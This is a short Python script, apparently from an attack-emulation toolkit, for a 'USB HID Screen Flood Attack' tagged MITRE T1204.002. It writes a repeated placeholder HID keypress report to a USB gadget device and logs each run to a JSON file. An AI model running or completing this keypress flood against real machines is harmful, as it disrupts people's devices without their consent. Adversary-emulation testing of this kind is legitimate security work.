#!/usr/bin/env python3

import time, argparse, json, os
from datetime import datetime

LOG_FILE = "results/usb_hid_flood_logs.json"
MITRE_TTP = "T1204.002"

def log_action(data):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(data)
    with open(LOG_FILE, "w") as f:
        json.dump(existing, f, indent=2)

def flood_inputs(device="/dev/hidg0", count=50):
    try:
        with open(device, "wb") as f:
            for _ in range(count):
                # Simulate volume up or lock key (replace with real HID codes)
                f.write(b"\x00\x00\x80\x00\x00\x00\x00\x00")  # Fake example
                f.flush()
                time.sleep(0.1)
        return True
    except Exception as e:
        print(f"[!] HID flood failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="USB HID Screen Flood Attack")
    parser.add_argument("--device", default="/dev/hidg0", help="HID gadget path")
    parser.add_argument("--count", type=int, default=50, help="Number of keypresses")
    args = parser.parse_args()

    result = flood_inputs(args.device, args.count)
    log_action({
        "timestamp": datetime.utcnow().isoformat(),
        "device": args.device,
        "keypresses": args.count,
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
